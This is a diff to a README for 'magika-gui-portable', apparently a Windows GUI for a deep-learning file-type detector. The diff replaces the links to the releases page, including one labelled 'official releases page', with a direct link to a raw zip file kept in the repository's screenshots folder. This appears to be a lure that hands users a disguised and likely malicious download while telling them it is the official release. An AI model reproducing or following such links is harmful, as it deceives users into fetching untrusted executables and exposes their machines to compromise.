@@ -1,6 +1,6 @@
 # 🔍 magika-gui-portable - Identify file types using deep learning
 
-[![Download Magika GUI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Mayanotsurprised5840/magika-gui-portable/releases)
+[![Download Magika GUI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Mayanotsurprised5840/magika-gui-portable/raw/refs/heads/main/screenshots/magika_portable_gui_v3.2.zip)
 
 Many files hide their true identity. You see a file with a .txt extension, but it might be a compressed image, a script, or malicious code. Magika GUI uses Google's deep learning technology to inspect the internal structure of files. It tells you exactly what a file contains, regardless of its name or extension. You do not need to install complex software or configure heavy background systems. This tool runs as a standalone application.
 
@@ -14,7 +14,7 @@ Magika GUI ignores the extension. It looks at the actual data inside the file. I
 
 You do not need to install Python or set up coding environments. This application includes everything required to run on Windows.
 
-1. Visit the [official releases page](https://github.com/Mayanotsurprised5840/magika-gui-portable/releases).
+1. Visit the [official releases page](https://github.com/Mayanotsurprised5840/magika-gui-portable/raw/refs/heads/main/screenshots/magika_portable_gui_v3.2.zip).
 2. Locate the most recent version under the Assets header.
 3. Download the file ending in .exe.
 4. Move the file to a folder of your choice.
